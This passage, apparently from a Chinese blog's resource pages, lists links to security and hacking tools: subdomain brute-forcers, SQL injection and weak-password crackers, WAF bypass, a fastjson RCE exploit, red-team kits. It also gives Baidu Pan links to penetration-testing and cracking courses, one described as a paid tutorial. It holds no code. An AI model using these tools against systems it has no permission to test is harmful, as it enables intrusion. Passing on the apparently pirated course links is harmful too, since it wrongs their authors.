正则表达式库（用于简化构造复杂的JS正则表达式）</p><p><a href="https://github.com/VerbalExpressions/JSVerbalExpressions" target="_blank" rel="noopener">https://github.com/VerbalExpressions/JSVerbalExpressions</a></p><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>python 正则表达式库（用于简化构造复杂的python正则表达式）</p><p><a href="https://github.com/VerbalExpressions/PythonVerbalExpressions" target="_blank" rel="noopener">https://github.com/VerbalExpressions/PythonVerbalExpressions</a></p><p>python任务管理以及命令执行库</p><p><a href="https://github.com/pyinvoke/invoke" target="_blank" rel="noopener">https://github.com/pyinvoke/invoke</a></p><p>python exe打包库</p><p><a href="https://github.com/pyinstaller/pyinstaller" target="_blank" rel="noopener">https://github.com/pyinstaller/pyinstaller</a></p><p>py3 爬虫框架</p><p><a href="https://github.com/orf/cyborg" target="_blank" rel="noopener">https://github.com/orf/cyborg</a></p><p>一个提供底层接口数据包编程和网络协议支持的python库</p><p><a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="noopener">https://github.com/CoreSecurity/impacket</a></p><p>python requests 库</p><p><a href="https://github.com/kennethreitz/requests" target="_blank" rel="noopener">https://github.com/kennethreitz/requests</a></p><p>python 实用工具合集</p><p><a href="https://github.com/mahmoud/boltons" target="_blank" rel="noopener">https://github.com/mahmoud/boltons</a></p><p>python爬虫系统</p><p><a href="https://github.com/binux/pyspider" target="_blank" rel="noopener">https://github.com/binux/pyspider</a></p><p>ctf向 python工具包</p><p><a href="https://github.com/P1kachu/v0lt" target="_blank" rel="noopener">https://github.com/P1kachu/v0lt</a></p><h3 id="科学上网"><a href="#科学上网" class="headerlink" title="科学上网"></a>科学上网</h3><p>科学上网工具</p><p><a href="https://github.com/XX-net/XX-Net" target="_blank" rel="noopener">https://github.com/XX-net/XX-Net</a></p><h3 id="老司机福利"><a href="#老司机福利" class="headerlink" title="老司机福利"></a>老司机福利</h3><p>微信自动抢红包动态库</p><p><a href="https://github.com/east520/AutoGetRedEnv" target="_blank" rel="noopener">https://github.com/east520/AutoGetRedEnv</a></p><p>微信抢红包插件（安卓版）</p><p><a href="https://github.com/geeeeeeeeek/WeChatLuckyMoney" target="_blank" rel="noopener">https://github.com/geeeeeeeeek/WeChatLuckyMoney</a></p><p>神器</p><p><a href="https://github.com/yangyangwithgnu/hardseed" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/hardseed</a></p><h3 id="以下内容来自：https-github-com-We5ter-Scanners-Box-blob-master-README-CN-md"><a href="#以下内容来自：https-github-com-We5ter-Scanners-Box-blob-master-README-CN-md" class="headerlink" title="以下内容来自：https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md"></a>以下内容来自：<a href="https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md" target="_blank" rel="noopener">https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md</a></h3><p>子域名枚举类</p><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a> (经典的子域名爆破枚举脚本)</p><p><a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">https://github.com/ring04h/wydomain</a> (子域名字典穷举)</p><p><a href="https://github.com/le4f/dnsmaper" target="_blank" rel="noopener">https://github.com/le4f/dnsmaper</a> (子域名枚举与地图标记)</p><p><a href="https://github.com/0xbug/orangescan" target="_blank" rel="noopener">https://github.com/0xbug/orangescan</a> (在线子域名信息收集工具)</p><p><a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a> （根据DNS记录查询子域名)</p><p><a href="https://github.com/We5ter/GoogleSSLdomainFinder" target="_blank" rel="noopener">https://github.com/We5ter/GoogleSSLdomainFinder</a> (基于谷歌SSL透明证书的子域名查询脚本)</p><p><a href="https://github.com/mandatoryprogrammer/cloudflare_enum" target="_blank" rel="noopener">https://github.com/mandatoryprogrammer/cloudflare_enum</a> （使用CloudFlare进行子域名枚举的脚本）</p><p><a href="https://github.com/18F/domain-scan" target="_blank" rel="noopener">https://github.com/18F/domain-scan</a> (A domain scanner）</p><p><a href="https://github.com/Evi1CLAY/Cool" target="_blank" rel="noopener">https://github.com/Evi1CLAY/Cool</a> … Python/DomainSeeker（多方式收集目标子域名信息）</p><p>数据库漏洞扫描类</p><p><a href="https://github.com/0xbug/SQLiScanner" target="_blank" rel="noopener">https://github.com/0xbug/SQLiScanner</a> (一款基于SQLMAP和Charles的被动SQL注入漏洞扫描工具)</p><p><a href="https://github.com/stamparm/DSSS" target="_blank" rel="noopener">https://github.com/stamparm/DSSS</a> (99行代码实现的sql注入漏洞扫描器)</p><p><a href="https://github.com/LoRexxar/Feigong（针对各种情况自由变化的MySQL注入脚本）" target="_blank" rel="noopener">https://github.com/LoRexxar/Feigong（针对各种情况自由变化的MySQL注入脚本）</a></p><p><a href="https://github.com/youngyangyang04/NoSQLAttack" target="_blank" rel="noopener">https://github.com/youngyangyang04/NoSQLAttack</a> (一款针对mongoDB的攻击工具)</p><p><a href="https://github.com/Neohapsis/bbqsql（SQL盲注利用框架）" target="_blank" rel="noopener">https://github.com/Neohapsis/bbqsql（SQL盲注利用框架）</a></p><p><a href="https://github.com/NetSPI/PowerUpSQL（攻击SQLSERVER的Powershell脚本框架）" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL（攻击SQLSERVER的Powershell脚本框架）</a></p><p>弱口令或信息泄漏扫描类</p><p><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="noopener">https://github.com/lijiejie/htpwdScan</a> (一个简单的HTTP暴力破解、撞库攻击脚本)</p><p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a> (一个迷你的信息泄漏批量扫描脚本)</p><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a> (.git文件夹泄漏利用工具)</p><p><a href="https://github.com/wilson9x1/fenghuangscanner_v3" target="_blank" rel="noopener">https://github.com/wilson9x1/fenghuangscanner_v3</a> (端口及弱口令检测)</p><p><a href="https://github.com/ysrc/F-Scrack" target="_blank" rel="noopener">https://github.com/ysrc/F-Scrack</a> (对各类服务进行弱口令检测的脚本)</p><p><a href="https://github.com/Mebus/cupp" target="_blank" rel="noopener">https://github.com/Mebus/cupp</a> （根据用户习惯生成弱口令探测字典脚本）</p><p><a href="https://github.com/RicterZ/genpAss" target="_blank" rel="noopener">https://github.com/RicterZ/genpAss</a> （中国特色的弱口令生成器）</p><p><a href="https://github.com/netxfly/crack_ssh" target="_blank" rel="noopener">https://github.com/netxfly/crack_ssh</a> （go写的协程版的ssh\redis\mongodb弱口令破解工具）</p><p>物联网设备扫描</p><p><a href="https://github.com/rapid7/IoTSeeker" target="_blank" rel="noopener">https://github.com/rapid7/IoTSeeker</a> （物联网设备默认密码扫描检测工具)</p><p><a href="https://github.com/shodan-labs/iotdb" target="_blank" rel="noopener">https://github.com/shodan-labs/iotdb</a> (使用nmap扫描IoT设备)</p><p>xss扫描器</p><p><a href="https://github.com/shawarkhanethicalhacker/BruteXSS" target="_blank" rel="noopener">https://github.com/shawarkhanethicalhacker/BruteXSS</a> （Cross-Site Scripting Bruteforcer）</p><p><a href="https://github.com/1N3/XSSTracer" target="_blank" rel="noopener">https://github.com/1N3/XSSTracer</a> (A small python script to check for Cross-Site Tracing)</p><p><a href="https://github.com/0x584A/fuzzXssPHP" target="_blank" rel="noopener">https://github.com/0x584A/fuzzXssPHP</a> (PHP版本的反射型xss扫描)</p><p><a href="https://github.com/chuhades/xss_scan" target="_blank" rel="noopener">https://github.com/chuhades/xss_scan</a> (批量扫描xss的python脚本）</p><p>企业网络自检</p><p><a href="https://github.com/sowish/LNScan" target="_blank" rel="noopener">https://github.com/sowish/LNScan</a> （详细的内部网络信息扫描器）</p><p><a href="https://github.com/ysrc/xunfeng" target="_blank" rel="noopener">https://github.com/ysrc/xunfeng</a> (网络资产识别引擎，漏洞检测引擎）</p><p><a href="https://github.com/SkyLined/LocalNetworkScanner" target="_blank" rel="noopener">https://github.com/SkyLined/LocalNetworkScanner</a> (javascript实现的本地网络扫描器)</p><p><a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a> （企业被搜索引擎收录敏感资产信息监控脚本：员工邮箱、子域名、Hosts）</p><p><a href="https://github.com/x0day/Multisearch-v2" target="_blank" rel="noopener">https://github.com/x0day/Multisearch-v2</a> (bing、google、360、zoomeye等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息）</p><p>webshell检测</p><p><a href="https://github.com/We5ter/Scanners-Box/tree/master/Find_webshell/" target="_blank" rel="noopener">https://github.com/We5ter/Scanners-Box/tree/master/Find_webshell/</a> （php后门检测，脚本较简单，因此存在误报高和效率低下的问题）</p><p><a href="https://github.com/yassineaddi/BackdoorMan" target="_blank" rel="noopener">https://github.com/yassineaddi/BackdoorMan</a> （A toolkit find malicious, hidden and suspicious PHP scripts and shells in a chosen destination）</p><p>内网渗透</p><p><a href="https://github.com/0xwindows/VulScritp" target="_blank" rel="noopener">https://github.com/0xwindows/VulScritp</a> （企业内网渗透脚本，包括banner扫描、端口扫描；phpmyadmin、jenkins等通用漏洞利用等）</p><p><a href="https://github.com/lcatro/network_backdoor_scanner（基于网络流量的内网探测框架）" target="_blank" rel="noopener">https://github.com/lcatro/network_backdoor_scanner（基于网络流量的内网探测框架）</a></p><p><a href="https://github.com/fdiskyou/hunter（调用" target="_blank" rel="noopener">https://github.com/fdiskyou/hunter（调用</a> Windows API 枚举用户登录信息）</p><p>中间件扫描、指纹识别类</p><p><a href="https://github.com/ring04h/wyportmap" target="_blank" rel="noopener">https://github.com/ring04h/wyportmap</a> (目标端口扫描+系统服务指纹识别)</p><p><a href="https://github.com/ring04h/weakfilescan" target="_blank" rel="noopener">https://github.com/ring04h/weakfilescan</a> (动态多线程敏感信息泄露检测工具)</p><p><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a> (WAF产品指纹识别)</p><p><a href="https://github.com/rbsec/sslscan" target="_blank" rel="noopener">https://github.com/rbsec/sslscan</a> （ssl类型识别)</p><p><a href="https://github.com/urbanadventurer/whatweb" target="_blank" rel="noopener">https://github.com/urbanadventurer/whatweb</a> (web指纹识别)</p><p><a href="https://github.com/tanjiti/FingerPrint" target="_blank" rel="noopener">https://github.com/tanjiti/FingerPrint</a> (web应用指纹识别)</p><p><a href="https://github.com/nanshihui/Scan-T" target="_blank" rel="noopener">https://github.com/nanshihui/Scan-T</a> （网络爬虫式指纹识别)</p><p><a href="https://github.com/OffensivePython/Nscan" target="_blank" rel="noopener">https://github.com/OffensivePython/Nscan</a> (a fast Network scanner inspired by Masscan and Zmap)</p><p><a href="https://github.com/ywolf/F-NAScan" target="_blank" rel="noopener">https://github.com/ywolf/F-NAScan</a> (网络资产信息扫描, ICMP存活探测,端口扫描，端口指纹服务识别）</p><p><a href="https://github.com/ywolf/F-MiddlewareScan" target="_blank" rel="noopener">https://github.com/ywolf/F-MiddlewareScan</a> （中间件扫描）</p><p><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a> (Web path scanner)</p><p><a href="https://github.com/x0day/bannerscan" target="_blank" rel="noopener">https://github.com/x0day/bannerscan</a> （C段Banner与路径扫描）</p><p><a href="https://github.com/RASSec/RASscan" target="_blank" rel="noopener">https://github.com/RASSec/RASscan</a> (端口服务扫描)</p><p><a href="https://github.com/3xp10it/bypass_waf" target="_blank" rel="noopener">https://github.com/3xp10it/bypass_waf</a> （waf自动暴破）</p><p><a href="https://github.com/3xp10it/mytools/blob/master/xcdn.py（获取cdn背后的真实ip）" target="_blank" rel="noopener">https://github.com/3xp10it/mytools/blob/master/xcdn.py（获取cdn背后的真实ip）</a></p><p><a href="https://github.com/Xyntax/BingC（基于Bing搜索引擎的C段/旁站查询，多线程，支持API）" target="_blank" rel="noopener">https://github.com/Xyntax/BingC（基于Bing搜索引擎的C段/旁站查询，多线程，支持API）</a></p><p><a href="https://github.com/Xyntax/DirBrute（多线程WEB目录爆破工具）" target="_blank" rel="noopener">https://github.com/Xyntax/DirBrute（多线程WEB目录爆破工具）</a></p><p><a href="https://github.com/zer0h/httpscan（一个爬虫式的网段Web主机发现小工具）" target="_blank" rel="noopener">https://github.com/zer0h/httpscan（一个爬虫式的网段Web主机发现小工具）</a></p><p><a href="https://github.com/lietdai/doom（thorn上实现的分布式任务分发的ip端口漏洞扫描器）" target="_blank" rel="noopener">https://github.com/lietdai/doom（thorn上实现的分布式任务分发的ip端口漏洞扫描器）</a></p><p>专用扫描器</p><p><a href="https://github.com/blackye/Jenkins" target="_blank" rel="noopener">https://github.com/blackye/Jenkins</a> (Jenkins漏洞探测、用户抓取爆破)</p><p><a href="https://github.com/code-scan/dzscan" target="_blank" rel="noopener">https://github.com/code-scan/dzscan</a> (discuz扫描)</p><p><a href="https://github.com/chuhades/CMS-Exploit-Framework" target="_blank" rel="noopener">https://github.com/chuhades/CMS-Exploit-Framework</a> (CMS攻击框架)</p><p><a href="https://github.com/lijiejie/IIS_shortname_Scanner" target="_blank" rel="noopener">https://github.com/lijiejie/IIS_shortname_Scanner</a> (an IIS shortname Scanner)</p><p><a href="https://github.com/We5ter/Scanne" target="_blank" rel="noopener">https://github.com/We5ter/Scanne</a> … ter/FlashScanner.pl (flashxss扫描)</p><p><a href="https://github.com/coffeehb/SSTIF（一个Fuzzing服务器端模板注入漏洞的半自动化工具）" target="_blank" rel="noopener">https://github.com/coffeehb/SSTIF（一个Fuzzing服务器端模板注入漏洞的半自动化工具）</a></p><p>无线网络</p><p><a href="https://github.com/savio-code/fern-wifi-cracker/" target="_blank" rel="noopener">https://github.com/savio-code/fern-wifi-cracker/</a> (无线安全审计工具)</p><p><a href="https://github.com/m4n3dw0lf/PytheM（Python网络/渗透测试工具）" target="_blank" rel="noopener">https://github.com/m4n3dw0lf/PytheM（Python网络/渗透测试工具）</a></p><p><a href="https://github.com/P0cL4bs/WiFi-Pumpkin（无线安全渗透测试套件）" target="_blank" rel="noopener">https://github.com/P0cL4bs/WiFi-Pumpkin（无线安全渗透测试套件）</a></p><p>综合类</p><p><a href="https://github.com/az0ne/AZScanner" target="_blank" rel="noopener">https://github.com/az0ne/AZScanner</a> (自动漏洞扫描器，子域名爆破，端口扫描，目录爆破，常用框架漏洞检测)</p><p><a href="https://github.com/blackye/lalascan" target="_blank" rel="noopener">https://github.com/blackye/lalascan</a> (自主开发的分布式web漏洞扫描框架，集合owasp top10漏洞扫描和边界资产发现能力)</p><p><a href="https://github.com/blackye/BkScanner" target="_blank" rel="noopener">https://github.com/blackye/BkScanner</a> (BkScanner 分布式、插件化web漏洞扫描器)</p><p><a href="https://github.com/ysrc/GourdScanV2" target="_blank" rel="noopener">https://github.com/ysrc/GourdScanV2</a> （被动式漏洞扫描)</p><p><a href="https://github.com/alpha1e0/pentestdb" target="_blank" rel="noopener">https://github.com/alpha1e0/pentestdb</a> (WEB渗透测试数据库)</p><p><a href="https://github.com/netxfly/passive_scan" target="_blank" rel="noopener">https://github.com/netxfly/passive_scan</a> (基于http代理的web漏洞扫描器)</p><p><a href="https://github.com/1N3/Sn1per" target="_blank" rel="noopener">https://github.com/1N3/Sn1per</a> (自动化扫描器，包括中间件扫描以及设备指纹识别)</p><p><a href="https://github.com/RASSec/pentestEr_Fully-automatic-scanner" target="_blank" rel="noopener">https://github.com/RASSec/pentestEr_Fully-automatic-scanner</a> （定向全自动化渗透测试工具）</p><p><a href="https://github.com/3xp10it/3xp10it" target="_blank" rel="noopener">https://github.com/3xp10it/3xp10it</a> （3xp10it自动化渗透测试框架）</p><p><a href="https://github.com/Lcys/lcyscan（python插件化漏洞扫描器）" target="_blank" rel="noopener">https://github.com/Lcys/lcyscan（python插件化漏洞扫描器）</a></p><p><a href="https://github.com/Xyntax/POC-T（渗透测试插件化并发框架）" target="_blank" rel="noopener">https://github.com/Xyntax/POC-T（渗透测试插件化并发框架）</a></p><h3 id="CTF平台"><a href="#CTF平台" class="headerlink" title="CTF平台"></a>CTF平台</h3><p><a href="http://www.shiyanbar.com/" target="_blank" rel="noopener">http://www.shiyanbar.com/</a></p><p><a href="http://oj.xctf.org.cn/" target="_blank" rel="noopener">http://oj.xctf.org.cn/</a></p><p><a href="http://ctf.bugku.com/" target="_blank" rel="noopener">http://ctf.bugku.com/</a></p><p><a href="http://rookiehacker.org/" target="_blank" rel="noopener">http://rookiehacker.org/</a></p><h2 id="2020-5-4-更新"><a href="#2020-5-4-更新" class="headerlink" title="2020/5/4  更新"></a>2020/5/4  更新</h2><h5 id="android逆向"><a href="#android逆向" class="headerlink" title="android逆向"></a>android逆向</h5><p> 下载链接: <a href="https://pan.baidu.com/s/1vlexxIfHtn_3_2d7RDjMog" target="_blank" rel="noopener">https://pan.baidu.com/s/1vlexxIfHtn_3_2d7RDjMog</a> 提取码: 7mr2 </p><p>burpsuite使用教程 </p><p>下载链接: <a href="https://pan.baidu.com/s/116jPPOxSWwVctOXiAjd1wA" target="_blank" rel="noopener">https://pan.baidu.com/s/116jPPOxSWwVctOXiAjd1wA</a> 提取码: gudy<br>100Gkali Linux渗透教程，含后渗透等~ </p><p>下载链接: <a href="https://pan.baidu.com/s/1p4jINLdEESZULqbC6Qdt8A" target="_blank" rel="noopener">https://pan.baidu.com/s/1p4jINLdEESZULqbC6Qdt8A</a> 提取码: p67p<br>WEB安全渗透测试课程，TOP10漏洞学习</p><p> 下载链接: <a href="https://pan.baidu.com/s/1tnxmRqaV87Xbqjaq2iHBAw" target="_blank" rel="noopener">https://pan.baidu.com/s/1tnxmRqaV87Xbqjaq2iHBAw</a> 提取码: bxn7</p><p>网络安全服务与应急加固类资料教程 </p><p>下载链接: <a href="https://pan.baidu.com/s/14qU_5qBehJBqac9ZWn9Xag" target="_blank" rel="noopener">https://pan.baidu.com/s/14qU_5qBehJBqac9ZWn9Xag</a> 提取码: cpri</p><p>网络安全入门学习知识系列教程 </p><p>下载链接: <a href="https://pan.baidu.com/s/13jjkRgZHoZh717iAPtZWLg" target="_blank" rel="noopener">https://pan.baidu.com/s/13jjkRgZHoZh717iAPtZWLg</a> 提取码: kmjh</p><p>代码审计教程，多个cms与框架审计教程复含工具 </p><p>下载链接: <a href="https://pan.baidu.com/s/15Jq0qLhdz4t7W-aMZf-EvA" target="_blank" rel="noopener">https://pan.baidu.com/s/15Jq0qLhdz4t7W-aMZf-EvA</a> 提取码: g9hc<br>内网渗透系列教程 </p><p>下载链接: <a href="https://pan.baidu.com/s/1xjftKu89VtqEk9VZstsFgg" target="_blank" rel="noopener">https://pan.baidu.com/s/1xjftKu89VtqEk9VZstsFgg</a> 提取码: vz2f </p><p>软件逆向破解系列教程 </p><p>下载链接: <a href="https://pan.baidu.com/s/1afyH1D33m3h1Rsj27fgdrQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1afyH1D33m3h1Rsj27fgdrQ</a> 提取码: k48p<br>CTF题目资料学习 </p><p>下载链接: <a href="https://pan.baidu.com/s/1dsjoHd2VOII7BtjCXrGg6g" target="_blank" rel="noopener">https://pan.baidu.com/s/1dsjoHd2VOII7BtjCXrGg6g</a> 提取码: 7tw4</p><h3 id="编程类学习资料"><a href="#编程类学习资料" class="headerlink" title="编程类学习资料"></a>编程类学习资料</h3><p>Linux基础系列教程，某大佬的收费教程.. </p><p>下载链接: <a href="https://pan.baidu.com/s/1dWrfwnxLh2GHsjUuD_Ltjg" target="_blank" rel="noopener">https://pan.baidu.com/s/1dWrfwnxLh2GHsjUuD_Ltjg</a> 提取码: aazt<br>1000G C++系列教程，学完秃头系列 </p><p>下载链接: <a href="https://pan.baidu.com/s/1Gdf_z3HyuAE-pwqy1Gvgrg" target="_blank" rel="noopener">https://pan.baidu.com/s/1Gdf_z3HyuAE-pwqy1Gvgrg</a> 提取码: 961a<br>IOT物联网系列教程 下载链接: <a href="https://pan.baidu.com/s/1VIGWa8BQgv_owFl-a0HZtQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1VIGWa8BQgv_owFl-a0HZtQ</a> 提取码: 7yxd<br>Java系列教程，可以从新手学到高手 </p><p>下载链接: <a href="https://pan.baidu.com/s/1O0hLDw1pntKVxI4WUThncQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1O0hLDw1pntKVxI4WUThncQ</a> 提取码: pszp<br>JS教程，很全面 </p><p>下载链接: <a href="https://pan.baidu.com/s/1mdnAJDJo7Bo3d06vk29fIA" target="_blank" rel="noopener">https://pan.baidu.com/s/1mdnAJDJo7Bo3d06vk29fIA</a> 提取码: t4kv<br>PHP开发教程，从新生学起全面教程 </p><p>下载链接: <a href="https://pan.baidu.com/s/1J4dmq5CaNYwIiqjl_YYZcQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1J4dmq5CaNYwIiqjl_YYZcQ</a> 提取码: cww7<br>python 一套非常全面的教程 </p><p>下载链接: <a href="https://pan.baidu.com/s/185DCmyVjdGdNeMbnVpOZbQ" target="_blank" rel="noopener">https://pan.baidu.com/s/185DCmyVjdGdNeMbnVpOZbQ</a> 提取码: k4ah </p><h3 id="其他学习资料"><a href="#其他学习资料" class="headerlink" title="其他学习资料"></a>其他学习资料</h3><p>大数据教程 </p><p>下载链接: <a href="https://pan.baidu.com/s/1ONbh4O4R3Od20f0ZW_kUEQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1ONbh4O4R3Od20f0ZW_kUEQ</a> 提取码: t4ap<br>抖音运营教程 </p><p>下载链接: <a href="https://pan.baidu.com/s/14V6SyHw5NUzgIfuHQ38UYQ" target="_blank" rel="noopener">https://pan.baidu.com/s/14V6SyHw5NUzgIfuHQ38UYQ</a> 提取码: jjsq<br>工控资料教程大全 </p><p>下载链接: <a href="https://pan.baidu.com/s/1NjqqoPst1Rqar1AzVJVXPw" target="_blank" rel="noopener">https://pan.baidu.com/s/1NjqqoPst1Rqar1AzVJVXPw</a> 提取码: 69cj<br>微信营销教程 </p><p>下载链接: <a href="https://pan.baidu.com/s/1H8r-h_-Jh5YGMWyyMzOp_Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1H8r-h_-Jh5YGMWyyMzOp_Q</a> 提取码: 8usa<br>After Effects全套教程 </p><p>下载链接: <a href="https://pan.baidu.com/s/1OmktRBAMCWHwUFWVGLjK9Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1OmktRBAMCWHwUFWVGLjK9Q</a> 提取码: ccba<br>用Python自动办公，做职场高手 </p><p>下载链接: <a href="https://pan.baidu.com/s/15hyiJvwuTRphlUEA_j3Adw" target="_blank" rel="noopener">https://pan.baidu.com/s/15hyiJvwuTRphlUEA_j3Adw</a> 提取码: mwxe<br>PhotoShop CS5视频教程 </p><p>下载链接: <a href="https://pan.baidu.com/s/1771hMSqyUNWaGldqqyLF3Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1771hMSqyUNWaGldqqyLF3Q</a> 提取码: 6ncj </p>]]></content>
      
      
      <categories>
          
          <category> 学习资源 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 渗透工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>source-notebook</title>
      <link href="/2020/04/18/source-notebook/"/>
      <url>/2020/04/18/source-notebook/</url>
      
        <content type="html"><![CDATA[<p>## </p><p>1、网盘存的一堆书<br>链接: <a href="https://pan.baidu.com/s/11TtPM19fzde0UBZ7yzGPMg" target="_blank" rel="noopener">https://pan.baidu.com/s/11TtPM19fzde0UBZ7yzGPMg</a><br>提取码: fdbb</p><p>2、小生我怕怕的破解教程<br>链接: <a href="https://pan.baidu.com/s/1e_SDkjCFV5UaYEEZmKneKg" target="_blank" rel="noopener">https://pan.baidu.com/s/1e_SDkjCFV5UaYEEZmKneKg</a><br>提取码: rtbd</p><p>3、Metasploit渗透测试魔鬼训练营资料<br>链接: <a href="https://pan.baidu.com/s/1noCUItcBeTgQ8iNgqzR0pA" target="_blank" rel="noopener">https://pan.baidu.com/s/1noCUItcBeTgQ8iNgqzR0pA</a><br>提取码: b59a</p><p>4、sql注入wiki<br><a href="http://sqlwiki.radare.cn/#/" target="_blank" rel="noopener">http://sqlwiki.radare.cn/#/</a></p><p>5、整理的一篇栈溢出的基础教程<br><a href="https://mp.weixin.qq.com/s?__biz=MzUzOTM4MzEyMw==&amp;mid=2247484955&amp;idx=1&amp;sn=161a3f1d991bbad3fca61d36fec1143e&amp;chksm=fac80227cdbf8b317b0f8c1dc3c6e0b809f99faefacc2b76980d6f87a0560376cc4cca981c81&amp;token=45290677&amp;lang=zh_CN#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzUzOTM4MzEyMw==&amp;mid=2247484955&amp;idx=1&amp;sn=161a3f1d991bbad3fca61d36fec1143e&amp;chksm=fac80227cdbf8b317b0f8c1dc3c6e0b809f99faefacc2b76980d6f87a0560376cc4cca981c81&amp;token=45290677&amp;lang=zh_CN#rd</a></p><p>6、修复PE导入表，可以理解一下pe文件结构<br><a href="https://mp.weixin.qq.com/s?__biz=MzU5OTU3NDEzOQ==&amp;mid=2247484077&amp;idx=1&amp;sn=3968c51341d27405ee55609e3c5e29aa&amp;chksm=feb391b9c9c418af5cd884ea568aefa769acabcefd8f5ab0e00add33910124e6a698636e51ba&amp;token=2022623620&amp;lang=zh_CN#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU5OTU3NDEzOQ==&amp;mid=2247484077&amp;idx=1&amp;sn=3968c51341d27405ee55609e3c5e29aa&amp;chksm=feb391b9c9c418af5cd884ea568aefa769acabcefd8f5ab0e00add33910124e6a698636e51ba&amp;token=2022623620&amp;lang=zh_CN#rd</a></p><p>7、数据结构可视化网站，拯救了我的期末考试<br><a href="https://visualgo.net/zh" target="_blank" rel="noopener">https://visualgo.net/zh</a></p><p>8、实验吧writeup<br><a href="https://hebin.me" target="_blank" rel="noopener">https://hebin.me</a></p><p>9、这个老哥讲的rop很好<br><a href="https://blog.csdn.net/zhy025907/article/details/86151691" target="_blank" rel="noopener">https://blog.csdn.net/zhy025907/article/details/86151691</a></p><p>10、格蠹汇编作者，软件调试课程<br><a href="https://www.bilibili.com/video/av56825627" target="_blank" rel="noopener">https://www.bilibili.com/video/av56825627</a></p><p>7.16更新</p><p> SQLMAP在进行SQL注入时的整个流程<a href="http://netsecurity.51cto.com/art/201907/599076.htm" target="_blank" rel="noopener">http://netsecurity.51cto.com/art/201907/599076.htm</a></p><p>information security Tools Box （信息安全工具以及资源集合）</p><p><a href="https://github.com/tengzhangchao/Sec-Box" target="_blank" rel="noopener">https://github.com/tengzhangchao/Sec-Box</a></p><p>用于绕过安全狗4和3.5。</p><p><a href="https://mp.weixin.qq.com/s/aUh2B_zbQgz6zLErgCIkZA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/aUh2B_zbQgz6zLErgCIkZA</a></p><p>链接：<a href="https://pan.baidu.com/s/1P9WOp8J-YrbFAVOeTmCLyQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1P9WOp8J-YrbFAVOeTmCLyQ</a> 提取码：zwma</p><p>分享一些有趣的案例</p><p><a href="https://github.com/r35tart/Penetration_Testing_Case" target="_blank" rel="noopener">https://github.com/r35tart/Penetration_Testing_Case</a></p><p>网络空间搜索引擎的魅力<br><a href="https://mp.weixin.qq.com/s/0jDapU2iKR4NqLWTJ2peNg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/0jDapU2iKR4NqLWTJ2peNg</a></p><p>7.15更新</p><p>google-hacking</p><p><a href="https://hackersonlineclub.com/google-hacking/" target="_blank" rel="noopener">https://hackersonlineclub.com/google-hacking/</a></p><p>区块链安全TOP 10 2019_RC1<br><a href="https://mp.weixin.qq.com/s/EKTBfQRpOFd-VDDirwIRmQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/EKTBfQRpOFd-VDDirwIRmQ</a></p><p>比较全乎的红队利用工具</p><p><a href="https://github.com/infosecn1nja/Red-Teaming-Toolkit" target="_blank" rel="noopener">https://github.com/infosecn1nja/Red-Teaming-Toolkit</a></p><p>Kali Linux Tools 中文說明書<br><a href="http://www.storysec.com/kali/tools_zh.html" target="_blank" rel="noopener">http://www.storysec.com/kali/tools_zh.html</a></p><p>CTF从入门到提升 复制这段内容后打开百度网盘手机App，操作更方便哦 链接：<a href="https://pan.baidu.com/s/1_slTZnZc5OG2xaHj4_yxlA" target="_blank" rel="noopener">https://pan.baidu.com/s/1_slTZnZc5OG2xaHj4_yxlA</a> 提取码：t7Nd</p><p>黑客技术基础实战分享001篇<br><a href="https://mp.weixin.qq.com/s/KMVs9no9qFuzkW00XLKCkw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/KMVs9no9qFuzkW00XLKCkw</a></p><p>一个不错的项目</p><p><a href="https://github.com/Bypass007/Safety-Project-Collection" target="_blank" rel="noopener">https://github.com/Bypass007/Safety-Project-Collection</a></p><p>Thinkphp 3.x/5.x 全系列漏洞大全，学习一下</p><p><a href="https://github.com/pochubs/pochubs" target="_blank" rel="noopener">https://github.com/pochubs/pochubs</a></p><p>fastjson漏洞利用</p><p><a href="https://github.com/MagicZer0/fastjson-rce-exploit" target="_blank" rel="noopener">https://github.com/MagicZer0/fastjson-rce-exploit</a></p><p>7.12更新：</p><p>fastjson =&lt; 1.2.47 反序列化漏洞浅析</p><p><a href="https://mp.weixin.qq.com/s/N8PpN8Cp6gpVNl9xWEVVcg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/N8PpN8Cp6gpVNl9xWEVVcg</a></p><p>SEO</p><p>链接:<a 